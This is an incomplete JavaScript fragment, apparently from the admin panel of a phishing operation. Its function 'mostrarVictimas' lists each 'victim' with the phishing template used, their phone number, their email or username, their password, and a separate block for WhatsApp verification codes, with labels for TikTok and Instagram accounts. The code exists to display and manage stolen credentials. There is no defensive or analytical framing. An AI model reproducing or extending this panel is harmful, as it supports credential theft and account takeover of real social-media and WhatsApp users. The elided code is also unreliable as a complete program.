...
function mostrarVictimas(snap) {
    ...
    snap.forEach(d => {
        ...
        // ── Encabezado ──
        html += `<strong style="color:#0f0">${v.template || "Sin template"}</strong><br>`;

        // ── Número siempre visible si existe ──
        if (v.numero) html += `Número: <b style="color:#0ff;font-size:14px;">${v.numero}</b><br>`;

        // ── Credenciales solo si NO es WhatsApp ──
        if (!esWhatsApp) {
            const labelUsuario = esTikTok || esInstagram ? "Usuario" : "Correo";
            if (v.correo || v.usuario) {
                html += `${labelUsuario}: <b style="color:#ff0">${v.correo || v.usuario}</b><br>`;
            }
            if (v.contraseña || v.password) {
                html += `Contraseña: <b style="color:#f0f">${v.contraseña || v.password}</b><br>`;
            }
        }
        ...
        // ── Bloque código WhatsApp SOLO si es WhatsApp ──
        if (esWhatsApp) {
            html += `
...
function iniciarChat() {
    ...
    const stylePar = document.createElement('style');
    stylePar.textContent = `@keyframes parpadeo { 0%,100% { opacity:1 } 50% { opacity:0.5 } }`;
    document.head.appendChild(stylePar);
}
